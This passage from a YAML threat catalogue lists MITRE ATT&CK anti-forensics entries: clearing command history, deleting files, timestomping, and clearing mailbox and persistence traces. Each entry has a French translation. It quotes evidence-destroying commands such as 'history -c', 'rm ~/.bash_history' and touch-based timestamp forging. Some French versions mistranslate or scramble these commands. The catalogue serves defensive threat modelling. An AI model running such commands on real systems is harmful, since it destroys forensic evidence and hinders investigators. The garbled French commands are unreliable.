          \ retarder la d\xE9tection d\u2019activit\xE9s malveillantes ou r\xE9duire\
          \ la fid\xE9lit\xE9 des alertes en faisant para\xEEtre les \xE9v\xE9nements\
          \ b\xE9nignes ou coh\xE9rents avec des op\xE9rations de routine. De plus,\
          \ les artefacts retir\xE9s ou modifi\xE9s s\xE9lectivement peuvent encore\
          \ \xEAtre r\xE9cup\xE9r\xE9s par une analyse m\xE9dico-l\xE9gale plus approfondie,\
          \ bien que leur absence ou modification puisse compliquer la reconstruction\
          \ et l\u2019attribution de la chronologie.\nhttps://attack.mitre.org/techniques/T1070"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1070.003
    ref_id: T1070.003
    name: Clear Command History
    description: "In addition to clearing system logs, an adversary may clear the\
      \ command history of a compromised account to conceal the actions undertaken\
      \ during an intrusion. Various command interpreters keep track of the commands\
      \ users type in their terminal so that users can retrace what they've done.\n\
      \nOn Linux and macOS, these command histories can be accessed in a few different\
      \ ways. While logged in, this command history is tracked in a file pointed to\
      \ by the environment variable <code>HISTFILE</code>. When a user logs off a\
      \ system, this information is flushed to a file in the user's home directory\
      \ called <code>~/.bash_history</code>. The benefit of this is that it allows\
      \ users to go back to commands they've used before in different sessions. Adversaries\
      \ may delete their commands from these logs by manually clearing the history\
      \ (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.\
      \  \n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)\
      \ on network devices to clear command history data (<code>clear logging</code>\
      \ and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A) On ESXi servers,\
      \ command history may be manually removed from the `/var/log/shell.log` file.(Citation:\
      \ Broadcom ESXi Shell Audit)\n\nOn Windows hosts, PowerShell has two different\
      \ command history providers: the built-in history and the command history managed\
      \ by the <code>PSReadLine</code> module. The built-in history only tracks the\
      \ commands used in the current session. This command history is not available\
      \ to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code>\
      \ command history tracks the commands used in all PowerShell sessions and writes\
      \ them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\\
      ConsoleHost_history.txt</code> by default). This history file is available to\
      \ all sessions and contains all past history since the file is not deleted when\
      \ the session ends.(Citation: Microsoft PowerShell Command History)\n\nAdversaries\
      \ may run the PowerShell command <code>Clear-History</code> to flush the entire\
      \ command history from a current PowerShell session. This, however, will not\
      \ delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may\
      \ also delete the <code>ConsoleHost_history.txt</code> file or edit its contents\
      \ to hide PowerShell commands they have run.(Citation: Sophos PowerShell command\
      \ audit)(Citation: Sophos PowerShell Command History Forensics)\nhttps://attack.mitre.org/techniques/T1070/003"
    translations:
      fr:
        name: Historique de commandement clair
        description: "En plus de supprimer les journaux syst\xE8me, un adversaire\
          \ peut effacer l\u2019historique de commandement d\u2019un compte compromis\
          \ afin de dissimuler les actions entreprises lors d\u2019une intrusion.\
          \ Divers interpr\xE9teurs de commandes suivent les commandes saisies par\
          \ les utilisateurs dans leur terminal afin que les utilisateurs puissent\
          \ retracer ce qu\u2019ils ont fait.\n\nSur Linux et macOS, ces historiques\
          \ de commandes peuvent \xEAtre consult\xE9s de plusieurs mani\xE8res diff\xE9\
          rentes. Pendant la connexion, cet historique de commandes est suivi dans\
          \ un fichier point\xE9 par la variable d\u2019environnement <code>HISTFILE</code>.\
          \ Lorsqu\u2019un utilisateur se d\xE9connecte d\u2019un syst\xE8me, cette\
          \ information est vid\xE9e dans un fichier dans son r\xE9pertoire personnel\
          \ appel\xE9 <code>~/.bash_history</code>. L\u2019avantage est que cela permet\
          \ aux utilisateurs de revenir aux commandes qu\u2019ils ont d\xE9j\xE0 utilis\xE9\
          es lors de diff\xE9rentes sessions. Les adversaires peuvent supprimer leurs\
          \ commandes de ces journaux en effa\xE7ant manuellement l\u2019historique\
          \ (<code>historique -c</code>) ou en supprimant le fichier historique bash\
          \ <code>rm ~/.bash_history</code>.  \n\nLes adversaires peuvent \xE9galement\
          \ utiliser une [CLI de dispositif r\xE9seau](https://attack.mitre.org/techniques/T1059/008)\
          \ sur les appareils r\xE9seau pour effacer les donn\xE9es de l\u2019historique\
          \ des commandes (<code>effacer la journalisation</code> et/ou <code>effacer\
          \ l\u2019historique).</code> (Citation : US-CERT-TA18-106A) Sur les serveurs\
          \ ESXi, l\u2019historique des commandes peut \xEAtre supprim\xE9 manuellement\
          \ du fichier '/var/log/shell.log'. (Citation : Audit Broadcom ESXi Shell)\n\
          \nSur les h\xF4tes Windows, PowerShell dispose de deux fournisseurs d\u2019\
          historique des commandes diff\xE9rents : l\u2019historique int\xE9gr\xE9\
          \ et l\u2019historique des commandes g\xE9r\xE9 par le module <code>PSReadLine</code>.\
          \ L\u2019historique int\xE9gr\xE9 ne suit que les commandes utilis\xE9es\
          \ dans la session en cours. Cet historique de commandes n\u2019est pas accessible\
          \ aux autres sessions et est supprim\xE9 \xE0 la fin de la session.\n\n\
          L\u2019historique des commandes <code>PSReadLine</code> suit les commandes\
          \ utilis\xE9es dans toutes les sessions PowerShell et les \xE9crit dans\
          \ un fichier (<code>$env\_:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\\
          ConsoleHost_history.txt</code> par d\xE9faut). Ce fichier d\u2019historique\
          \ est accessible \xE0 toutes les sessions et contient tout l\u2019historique\
          \ pass\xE9 puisque le fichier n\u2019est pas supprim\xE9 \xE0 la fin de\
          \ la session. (Citation : Historique des commandes Microsoft PowerShell)\n\
          \nLes adversaires peuvent ex\xE9cuter la commande <code>PowerShell Clear-History</code>\
          \ pour effacer l\u2019historique complet des commandes d\u2019une session\
          \ PowerShell en cours. Cela ne supprimera pas ou ne videra pas le <code>fichier\
          \ ConsoleHost_history.txt</code>. Les adversaires peuvent \xE9galement supprimer\
          \ le <code>fichier ConsoleHost_history.txt</code> ou modifier son contenu\
          \ pour masquer les commandes PowerShell qu\u2019ils ont ex\xE9cut\xE9es.\
          \ (Citation : audit de commande PowerShell de Sophos)(Citation : Historique\
          \ des commandes PowerShell Sophos Forensics)\nhttps://attack.mitre.org/techniques/T1070/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1070.004
    ref_id: T1070.004
    name: File Deletion
    description: 'Adversaries may delete files left behind by the actions of their
      intrusion activity. Malware, tools, or other non-native files dropped or created
      on a system by an adversary (ex: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105))
      may leave traces to indicate to what was done within a network and how. Removal
      of these files can occur during an intrusion, or as part of a post-intrusion
      process to minimize the adversary''s footprint.


      There are tools available from the host operating system to perform cleanup,
      but adversaries may use other tools as well.(Citation: Microsoft SDelete July
      2016) Examples of built-in [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)
      functions include <code>del</code> on Windows, <code>rm</code> or <code>unlink</code>
      on Linux and macOS, and `rm` on ESXi.

      https://attack.mitre.org/techniques/T1070/004'
    translations:
      fr:
        name: Suppression de fichiers
        description: "Les adversaires peuvent supprimer les fichiers laiss\xE9s par\
          \ les actions de leur activit\xE9 d\u2019intrusion. Des logiciels malveillants,\
          \ des outils ou d\u2019autres fichiers non natifs abandonn\xE9s ou cr\xE9\
          \xE9s sur un syst\xE8me par un adversaire (ex : [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105))\
          \ peuvent laisser des traces indiquant ce qui a \xE9t\xE9 fait dans un r\xE9\
          seau et comment. La suppression de ces fichiers peut avoir lieu lors d\u2019\
          une intrusion, ou dans le cadre d\u2019un processus post-intrusion afin\
          \ de minimiser l\u2019empreinte de l\u2019adversaire.\n\nIl existe des outils\
          \ disponibles du syst\xE8me d\u2019exploitation h\xF4te pour effectuer le\
          \ nettoyage, mais les adversaires peuvent aussi utiliser d\u2019autres outils.\
          \ (Citation : Microsoft SDelete juillet 2016) Des exemples de fonctions\
          \ int\xE9gr\xE9es [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)\
          \ incluent <code>del</code> sur Windows, <code>rm</code> ou <code>unlink</code>\
          \ sur Linux et macOS, et 'rm' sur ESXi.\nhttps://attack.mitre.org/techniques/T1070/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1070.005
    ref_id: T1070.005
    name: Network Share Connection Removal
    description: 'Adversaries may remove share connections that are no longer useful
      in order to clean up traces of their operation. Windows shared drive and [SMB/Windows
      Admin Shares](https://attack.mitre.org/techniques/T1021/002) connections can
      be removed when no longer needed. [Net](https://attack.mitre.org/software/S0039)
      is an example utility that can be used to remove network share connections with
      the <code>net use \\system\share /delete</code> command. (Citation: Technet
      Net Use)

      https://attack.mitre.org/techniques/T1070/005'
    translations:
      fr:
        name: "Suppression de la connexion du partage r\xE9seau"
        description: "Les adversaires peuvent supprimer des connexions de partage\
          \ qui ne sont plus utiles afin de nettoyer les traces de leur fonctionnement.\
          \ Les connexions de disques partag\xE9s Windows et de [SMB/Windows Admin\
          \ Shares](https://attack.mitre.org/techniques/T1021/002) peuvent \xEAtre\
          \ supprim\xE9es lorsqu\u2019elles ne sont plus n\xE9cessaires. [Net](https://attack.mitre.org/software/S0039)\
          \ est un utilitaire exemple qui peut \xEAtre utilis\xE9 pour supprimer les\
          \ connexions de partage r\xE9seau avec la commande <code>d\u2019utilisation\
          \ du net \\\\system\\share /supprimer</code>. (Citation : Utilisation du\
          \ net de Technet)\nhttps://attack.mitre.org/techniques/T1070/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1070.006
    ref_id: T1070.006
    name: Timestomp
    description: "Adversaries may modify file time attributes to hide new files or\
      \ changes to existing files. Timestomping is a technique that modifies the timestamps\
      \ of a file (the modify, access, create, and change times), often to mimic files\
      \ that are in the same folder and blend malicious files with legitimate files.\n\
      \nIn Windows systems, both the `$STANDARD_INFORMATION` (`$SI`) and `$FILE_NAME`\
      \ (`$FN`) attributes record times in a Master File Table (MFT) file.(Citation:\
      \ Inversecos Timestomping 2022) `$SI` (dates/time stamps) is displayed to the\
      \ end user, including in the File System view, while `$FN` is dealt with by\
      \ the kernel.(Citation: Magnet Forensics)\n\nModifying the `$SI` attribute is\
      \ the most common method of timestomping because it can be modified at the user\
      \ level using API calls. `$FN` timestomping, however, typically requires interacting\
      \ with the system kernel or moving or renaming a file.(Citation: Inversecos\
      \ Timestomping 2022)\n\nAdversaries modify timestamps on files so that they\
      \ do not appear conspicuous to forensic investigators or file analysis tools.\
      \ In order to evade detections that rely on identifying discrepancies between\
      \ the `$SI` and `$FN` attributes, adversaries may also engage in \u201Cdouble\
      \ timestomping\u201D by modifying times on both attributes simultaneously.(Citation:\
      \ Double Timestomping)\n\nIn Linux systems and on ESXi servers, threat actors\
      \ may attempt to perform timestomping using commands such as `touch -a -m -t\
      \ <timestamp> <filename>` (which sets access and modification times to a specific\
      \ value) or `touch -r <filename> <filename>` (which sets access and modification\
      \ times to match those of another file).(Citation: Inversecos Linux Timestomping)(Citation:\
      \ Juniper Networks ESXi Backdoor 2022)\n\nTimestomping may be used along with\
      \ file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide\
      \ malware and tools.(Citation: WindowsIR Anti-Forensic Techniques)\nhttps://attack.mitre.org/techniques/T1070/006"
    translations:
      fr:
        name: Timestomp
        description: "Les adversaires peuvent modifier les attributs de temps de fichier\
          \ pour masquer de nouveaux fichiers ou modifier des fichiers existants.\
          \ Le timetomping est une technique qui modifie les horodatages d\u2019un\
          \ fichier (les temps de modification, acc\xE8s, cr\xE9ation et modification),\
          \ souvent pour imiter des fichiers dans le m\xEAme dossier et m\xE9langer\
          \ des fichiers malveillants avec des fichiers l\xE9gitimes.\n\nDans les\
          \ syst\xE8mes Windows, les attributs \xAB $STANDARD_INFORMATION \xBB ('$SI')\
          \ et \xAB $FILE_NAME \xBB ('$FN') enregistrent tous deux les temps dans\
          \ un fichier Master File Table (MFT). (Citation : Inversecos Timestomping\
          \ 2022) \xAB $SI \xBB (dates/horodatages) est affich\xE9 \xE0 l\u2019utilisateur\
          \ final, y compris dans la vue syst\xE8me de fichiers, tandis que \xAB $FN\
          \ \xBB est g\xE9r\xE9 par le noyau. (Citation : Magnet Forensics)\n\nModifier\
          \ l\u2019attribut \xAB $SI \xBB est la m\xE9thode la plus courante de timetomping\
          \ car elle peut \xEAtre modifi\xE9e au niveau utilisateur via des appels\
          \ API. Cependant, le \xAB $FN \xBB timetomping n\xE9cessite g\xE9n\xE9ralement\
          \ d\u2019interagir avec le noyau syst\xE8me ou de d\xE9placer ou renommer\
          \ un fichier. (Citation : Inversecos Timestomping 2022)\n\nLes adversaires\
          \ modifient les horodatages des dossiers afin qu\u2019ils ne paraissent\
          \ pas visibles aux yeux des enqu\xEAteurs m\xE9dico-l\xE9gaux ou des outils\
          \ d\u2019analyse de dossiers. Pour \xE9viter les d\xE9tections qui reposent\
          \ sur l\u2019identification des divergences entre les attributs \xAB $SI\
          \ \xBB et \xAB $FN \xBB, les adversaires peuvent \xE9galement pratiquer\
          \ un \xAB double timetomping \xBB en modifiant simultan\xE9ment les temps\
          \ des deux attributs. (Citation : Double Timestomping)\n\nDans les syst\xE8\
          mes Linux et sur les serveurs ESXi, les acteurs de menace peuvent tenter\
          \ d\u2019effectuer des timetomping en utilisant des commandes telles que\
          \ \xAB touch -a -m <timestamp> <filename>-t \xBB (qui d\xE9finit les temps\
          \ d\u2019acc\xE8s et de modification \xE0 une valeur sp\xE9cifique) ou \xAB\
          \ touch -<filename><filename>r \xBB (qui ajuste les temps d\u2019acc\xE8\
          s et de modification pour correspondre \xE0 ceux d\u2019un autre fichier).\
          \ Citation : Inversecos Linux Timestomping) (Citation : Juniper Networks\
          \ ESXi Backdoor 2022)\n\nTimestomping peut \xEAtre utilis\xE9 avec le nom\
          \ de fichier [Masquerading](https://attack.mitre.org/techniques/T1036) pour\
          \ dissimuler des logiciels malveillants et des outils. (Citation : Techniques\
          \ anti-m\xE9dico-l\xE9gales WindowsIR)\nhttps://attack.mitre.org/techniques/T1070/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1070.007
    ref_id: T1070.007
    name: Clear Network Connection History and Configurations
    description: 'Adversaries may clear or remove evidence of malicious network connections
      in order to clean up traces of their operations. Configuration settings as well
      as various artifacts that highlight connection history may be created on a system
      and/or in application logs from behaviors that require network connections,
      such as [Remote Services](https://attack.mitre.org/techniques/T1021) or [External
      Remote Services](https://attack.mitre.org/techniques/T1133). Defenders may use
      these artifacts to monitor or otherwise analyze network connections created
      by adversaries.


      Network connection history may be stored in various locations. For example,
      RDP connection history may be stored in Windows Registry values under (Citation:
      Microsoft RDP Removal):


      * <code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers</code>


      Windows may also store information about recent RDP connections in files such
      as <code>C:\Users\\%username%\Documents\Default.rdp</code> and `C:\Users\%username%\AppData\Local\Microsoft\Terminal

      Server Client\Cache\`.(Citation: Moran RDPieces) Similarly, macOS and Linux
      hosts may store information highlighting connection history in system logs (such
      as those stored in `/Library/Logs` and/or `/var/log/`).(Citation: Apple Culprit
      Access)(Citation: FreeDesktop Journal)(Citation: Apple Unified Log Analysis
      Remote Login and Screen Sharing)


      Malicious network connections may also require changes to third-party applications
      or network configuration settings, such as [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1686)
      or tampering to enable [Proxy](https://attack.mitre.org/techniques/T1090). Adversaries
      may delete or modify this data to conceal indicators and/or impede defensive
      analysis.

      https://attack.mitre.org/techniques/T1070/007'
    translations:
      fr:
        name: "Historique et configurations de connexion r\xE9seau clair"
        description: "Les adversaires peuvent effacer ou retirer des preuves de connexions\
          \ r\xE9seau malveillantes afin de nettoyer les traces de leurs op\xE9rations.\
          \ Des param\xE8tres de configuration ainsi que divers artefacts mettant\
          \ en \xE9vidence l\u2019historique des connexions peuvent \xEAtre cr\xE9\
          \xE9s sur un syst\xE8me et/ou dans les journaux d\u2019application \xE0\
          \ partir de comportements n\xE9cessitant des connexions r\xE9seau, tels\
          \ que [Services distants](https://attack.mitre.org/techniques/T1021) ou\
          \ [Services distants externes](https://attack.mitre.org/techniques/T1133).\
          \ Les d\xE9fenseurs peuvent utiliser ces artefacts pour surveiller ou analyser\
          \ autrement les connexions r\xE9seau cr\xE9\xE9es par les adversaires.\n\
          \nL\u2019historique des connexions r\xE9seau peut \xEAtre stock\xE9 \xE0\
          \ diff\xE9rents endroits. Par exemple, l\u2019historique des connexions\
          \ RDP peut \xEAtre stock\xE9 dans les valeurs du Registre Windows sous (Citation\
          \ : Suppression Microsoft RDP) :\n\n* <code>HKEY_CURRENT_USER\\logiciel\\\
          Microsoft\\Client serveur terminal\\Par d\xE9faut</code>\n* <code>HKEY_CURRENT_USER\\\
          logiciel\\Microsoft\\Terminal Server Client\\Servers</code>\n\nWindows peut\
          \ \xE9galement stocker des informations sur les connexions RDP r\xE9centes\
          \ dans des fichiers tels que <code>C\_:\\Users\\\_%username\_%\\Documents\\\
          Default.rdp</code> et 'C\_:\\Users\\\_%username\_%\\AppData\\Local\\Microsoft\\\
          Terminal\nClient serveur\\Cache\\'. (Citation : Moran RDPieces) De m\xEA\
          me, les h\xF4tes macOS et Linux peuvent stocker les informations mettant\
          \ en \xE9vidence l\u2019historique des connexions dans les journaux syst\xE8\
          me (comme ceux stock\xE9s dans '/Library/Logs' et/ou '/var/log/'). (Citation\
          \ : Acc\xE8s aux coupables Apple)(Citation : FreeDesktop Journal)(Citation\
          \ : Analyse unifi\xE9e des journaux Apple Connexion \xE0 distance et partage\
          \ d\u2019\xE9cran)\n\nLes connexions r\xE9seau malveillantes peuvent \xE9\
          galement n\xE9cessiter des modifications d\u2019applications tierces ou\
          \ de param\xE8tres de configuration r\xE9seau, telles que [D\xE9sactiver\
          \ ou modifier le pare-feu syst\xE8me](https://attack.mitre.org/techniques/T1686)\
          \ ou une alt\xE9ration pour activer [Proxy](https://attack.mitre.org/techniques/T1090).\
          \ Les adversaires peuvent supprimer ou modifier ces donn\xE9es pour dissimuler\
          \ des indicateurs et/ou entraver une analyse d\xE9fensive.\nhttps://attack.mitre.org/techniques/T1070/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1070.008
    ref_id: T1070.008
    name: Clear Mailbox Data
    description: "Adversaries may modify mail and mail application data to remove\
      \ evidence of their activity. Email applications allow users and other programs\
      \ to export and delete mailbox data via command line tools or use of APIs. Mail\
      \ application data can be emails, email metadata, or logs generated by the application\
      \ or operating system, such as export requests. \n\nAdversaries may manipulate\
      \ emails and mailbox data to remove logs, artifacts, and metadata, such as evidence\
      \ of [Phishing](https://attack.mitre.org/techniques/T1566)/[Internal Spearphishing](https://attack.mitre.org/techniques/T1534),\
      \ [Email Collection](https://attack.mitre.org/techniques/T1114), [Mail Protocols](https://attack.mitre.org/techniques/T1071/003)\
      \ for command and control, or email-based exfiltration such as [Exfiltration\
      \ Over Alternative Protocol](https://attack.mitre.org/techniques/T1048). For\
      \ example, to remove evidence on Exchange servers adversaries have used the\
      \ <code>ExchangePowerShell</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ module, including <code>Remove-MailboxExportRequest</code> to remove evidence\
      \ of mailbox exports.(Citation: Volexity SolarWinds)(Citation: ExchangePowerShell\
      \ Module) On Linux and macOS, adversaries may also delete emails through a command\
      \ line utility called <code>mail</code>  or use [AppleScript](https://attack.mitre.org/techniques/T1059/002)\
      \ to interact with APIs on macOS.(Citation: Cybereason Cobalt Kitty 2017)(Citation:\
      \ mailx man page)\n\nAdversaries may also remove emails and metadata/headers\
      \ indicative of spam or suspicious activity (for example, through the use of\
      \ organization-wide transport rules) to reduce the likelihood of malicious emails\
      \ being detected by security products.(Citation: Microsoft OAuth Spam 2022)\n\
      https://attack.mitre.org/techniques/T1070/008"
    translations:
      fr:
        name: "Effacer les donn\xE9es de la bo\xEEte aux lettres"
        description: "Les adversaires peuvent modifier les courriers et les donn\xE9\
          es de demande de courrier pour supprimer les preuves de leur activit\xE9\
          . Les applications de messagerie \xE9lectronique permettent aux utilisateurs\
          \ et autres programmes d\u2019exporter et de supprimer des donn\xE9es de\
          \ bo\xEEte aux lettres via des outils en ligne de commande ou en utilisant\
          \ des API. Les donn\xE9es d\u2019application mail peuvent \xEAtre des courriels,\
          \ des m\xE9tadonn\xE9es d\u2019email ou des journaux g\xE9n\xE9r\xE9s par\
          \ l\u2019application ou le syst\xE8me d\u2019exploitation, comme des requ\xEA\
          tes d\u2019exportation. \n\nLes adversaires peuvent manipuler les emails\
          \ et les donn\xE9es des bo\xEEtes aux lettres pour supprimer des journaux,\
          \ des artefacts et des m\xE9tadonn\xE9es, tels que des preuves de [Phishing](https://attack.mitre.org/techniques/T1566)/[Spearphishing\
          \ interne](https://attack.mitre.org/techniques/T1534), [Collecte d\u2019\
          emails](https://attack.mitre.org/techniques/T1114), [Protocoles de message](https://attack.mitre.org/techniques/T1071/003)\
          \ pour le commandement et le contr\xF4le, ou l\u2019exfiltration bas\xE9\
          e sur les e-mails telles que [Exfiltration sur alternative Protocole](https://attack.mitre.org/techniques/T1048).\
          \ Par exemple, pour supprimer des preuves sur les serveurs Exchange, les\
          \ adversaires ont utilis\xE9 le module <code>ExchangePowerShell</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001),\
          \ incluant <code>Remove-MailboxExportRequest</code> pour supprimer les preuves\
          \ d\u2019exportations de bo\xEEtes postales. (Citation : Volexity SolarWinds)(Citation\
          \ : Module ExchangePowerShell) Sur Linux et macOS, les adversaires peuvent\
          \ \xE9galement supprimer les emails via un utilitaire en ligne de commande\
          \ appel\xE9 <code>mail</code> ou utiliser [AppleScript](https://attack.mitre.org/techniques/T1059/002)\
          \ pour interagir avec les API sur macOS. (Citation : Cybereason Cobalt Kitty\
          \ 2017)(Citation : page de main mailx)\n\nLes adversaires peuvent \xE9galement\
          \ supprimer les emails et m\xE9tadonn\xE9es/en-t\xEAtes indiquant du spam\
          \ ou une activit\xE9 suspecte (par exemple, par l\u2019utilisation de r\xE8\
          gles de transport \xE0 l\u2019\xE9chelle de l\u2019organisation) afin de\
          \ r\xE9duire la probabilit\xE9 que des emails malveillants soient d\xE9\
          tect\xE9s par des produits de s\xE9curit\xE9. (Citation : Microsoft OAuth\
          \ Spam 2022)\nhttps://attack.mitre.org/techniques/T1070/008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1070.009
    ref_id: T1070.009
    name: Clear Persistence
    description: "Adversaries may clear artifacts associated with previously established\
      \ persistence on a host system to remove evidence of their activity. This may\
      \ involve various actions, such as removing services, deleting executables,\
      \ [Modify Registry](https://attack.mitre.org/techniques/T1112), [Plist File\
      \ Modification](https://attack.mitre.org/techniques/T1647), or other methods\
      \ of cleanup to prevent defenders from collecting evidence of their persistent\
      \ presence.(Citation: Cylance Dust Storm) Adversaries may also delete accounts\
      \ previously created to maintain persistence (i.e. [Create Account](https://attack.mitre.org/techniques/T1136)).(Citation:\
      \ Talos - Cisco Attack 2022)\n\nIn some instances, artifacts of persistence\
      \ may also be removed once an adversary\u2019s persistence is executed in order\
      \ to prevent errors with the new instance of the malware.(Citation: NCC Group\
      \ Team9 June 2020)\nhttps://attack.mitre.org/techniques/T1070/009"
    translations:
      fr:
        name: Persistance Claire
        description: "Les adversaires peuvent effacer les artefacts associ\xE9s \xE0\
          \ une persistance pr\xE9alablement \xE9tablie sur un syst\xE8me h\xF4te\
          \ afin d\u2019\xE9liminer les preuves de leur activit\xE9. Cela peut impliquer\
          \ diverses actions, telles que la suppression de services, la suppression\
          \ d\u2019ex\xE9cutables, [Modifier le registre](https://attack.mitre.org/techniques/T1112),\
          \ [Modification de fichier Plist](https://attack.mitre.org/techniques/T1647),\
          \ ou d\u2019autres m\xE9thodes de nettoyage visant \xE0 emp\xEAcher les\
          \ d\xE9fenseurs de collecter des preuves de leur pr\xE9sence persistante.\
          \ (Citation : Temp\xEAte de Poussi\xE8re Cylance) Les adversaires peuvent\
          \ \xE9galement supprimer des comptes cr\xE9\xE9s pr\xE9c\xE9demment pour\
          \ maintenir la persistance (c\u2019est-\xE0-dire [Cr\xE9er un compte](https://attack.mitre.org/techniques/T1136)).\
          \ (Citation : Talos - Cisco Attack 2022)\n\nDans certains cas, les artefacts\
          \ de persistance peuvent \xE9galement \xEAtre supprim\xE9s une fois la persistance\
          \ d\u2019un adversaire ex\xE9cut\xE9e afin d\u2019\xE9viter les erreurs\
          \ avec la nouvelle instance du malware. (Citation : NCC Group Team9 juin\
          \ 2020)\nhttps://attack.mitre.org/techniques/T1070/009"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1070.010
    ref_id: T1070.010
    name: Relocate Malware
    description: 'Once a payload is delivered, adversaries may reproduce copies of
      the same malware on the victim system to remove evidence of their presence and/or
      avoid defenses. Copying malware payloads to new locations may also be combined
      with [File Deletion](https://attack.mitre.org/techniques/T1070/004) to cleanup
      older artifacts.


      Relocating malware may be a part of many actions intended to evade defenses.
      For example, adversaries may copy and rename payloads to better blend into the
      local environment (i.e., [Match Legitimate Resource Name or Location](https://attack.mitre.org/techniques/T1036/005)).(Citation:
      DFIR Report Trickbot June 2023) Payloads may also be repositioned to target
      [File/Path Exclusions](https://attack.mitre.org/techniques/T1564/012) as well
      as specific locations associated with establishing [Persistence](https://attack.mitre.org/tactics/TA0003).(Citation:
      Latrodectus APR 2024)


      Relocating malicious payloads may also hinder defensive analysis, especially
      to separate these payloads from earlier events (such as [User Execution](https://attack.mitre.org/techniques/T1204)
      and [Phishing](https://attack.mitre.org/techniques/T1566)) that may have generated
      alerts or otherwise drawn attention from defenders. Moving payloads into target
      directories does not alter the Creation timestamp, thereby evading detection
      logic reliant on modifications to this artifact (i.e., [Timestomp](https://attack.mitre.org/techniques/T1070/006)).

      https://attack.mitre.org/techniques/T1070/010'
    translations:
      fr:
        name: Malware de relocalisation
        description: "Une fois la charge utile livr\xE9e, les adversaires peuvent\
          \ reproduire des copies du m\xEAme malware sur le syst\xE8me victime afin\
          \ d\u2019\xE9liminer les preuves de leur pr\xE9sence et/ou d\u2019\xE9viter\
          \ les d\xE9fenses. La copie des charges utiles de logiciels malveillants\
          \ vers de nouveaux emplacements peut \xE9galement \xEAtre combin\xE9e avec\
          \ [Suppression de fichier](https://attack.mitre.org/techniques/T1070/004)\
          \ pour nettoyer les anciens artefacts.\n\nLe d\xE9placement des logiciels\
          \ malveillants peut faire partie de nombreuses actions visant \xE0 contourner\
          \ les d\xE9fenses. Par exemple, les adversaires peuvent copier et renommer\
          \ les charges utiles pour mieux s\u2019int\xE9grer \xE0 l\u2019environnement\
          \ local (c\u2019est-\xE0-dire [Correspondre le nom ou la localisation l\xE9\
          gitime de la ressource](https://attack.mitre.org/techniques/T1036/005)).\
          \ (Citation : Rapport DFIR Trickbot juin 2023) Les charges utiles peuvent\
          \ \xE9galement \xEAtre repositionn\xE9es pour cibler les [Exclusions de\
          \ fichier/chemin](https://attack.mitre.org/techniques/T1564/012) ainsi que\
          \ des emplacements sp\xE9cifiques associ\xE9s \xE0 l\u2019\xE9tablissement\
          \ de [Persistance](https://attack.mitre.org/tactics/TA0003). (Citation :\
          \ Latrodectus APR 2024)\n\nLe d\xE9placement des charges utiles malveillantes\
          \ peut \xE9galement entraver l\u2019analyse d\xE9fensive, notamment pour\
          \ s\xE9parer ces charges utiles des \xE9v\xE9nements ant\xE9rieurs (tels\
          \ que [Ex\xE9cution utilisateur](https://attack.mitre.org/techniques/T1204)\
          \ et [Phishing](https://attack.mitre.org/techniques/T1566)) qui auraient\
          \ pu g\xE9n\xE9rer des alertes ou attirer l\u2019attention des d\xE9fenseurs.\
          \ Le d\xE9placement des charges utiles dans les r\xE9pertoires cibles ne\
          \ modifie pas l\u2019horodatage de cr\xE9ation, \xE9vitant ainsi la logique\
          \ de d\xE9tection d\xE9pendant de modifications de cet artefact (c\u2019\
          est-\xE0-dire [Timestomp](https://attack.mitre.org/techniques/T1070/006)).\n\
          https://attack.mitre.org/techniques/T1070/010"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1071
    ref_id: T1071
    name: Application Layer Protocol
    description: "Adversaries may communicate using OSI application layer protocols\
      \ to avoid detection/network filtering by blending in with existing traffic.\
      \ Commands to the remote system, and often the results of those commands, will\
      \ be embedded within the protocol traffic between the client and server. \n\n\
      Adversaries may utilize many different protocols, including those used for web\
      \ browsing, transferring files, electronic mail, DNS, or publishing/subscribing.\
      \ For connections that occur internally within an enclave (such as those between\
      \ a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH,\
      \ or RDP.(Citation: Mandiant APT29 Eye Spy Email Nov 22)\nhttps://attack.mitre.org/techniques/T1071"
    translations:
      fr:
        name: Protocole de couche application
        description: "Les adversaires peuvent communiquer en utilisant les protocoles\
          \ de niveau applicatif OSI pour \xE9viter la d\xE9tection ou le filtrage\
          \ r\xE9seau en se fondant dans le trafic existant. Les commandes vers le\
          \ syst\xE8me distant, et souvent les r\xE9sultats de ces commandes, seront\
          \ int\xE9gr\xE9es dans le trafic protocolaire entre le client et le serveur.\
          \ \n\nLes adversaires peuvent utiliser de nombreux protocoles diff\xE9rents,\
          \ notamment ceux utilis\xE9s pour la navigation web, le transfert de fichiers,\
          \ le courrier \xE9lectronique, le DNS, ou la publication/abonnement. Pour\
          \ les connexions qui se produisent en interne au sein d\u2019une enclave\
          \ (comme celles entre un proxy ou un n\u0153ud pivot et d\u2019autres n\u0153\
          uds), les protocoles couramment utilis\xE9s sont SMB, SSH ou RDP. (Citation\
          \ : Mandiant APT29 Eye Spy Email 22 nov.)\nhttps://attack.mitre.org/techniques/T1071"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1071.001
    ref_id: T1071.001
    name: Web Protocols
    description: "Adversaries may communicate using application layer protocols associated\
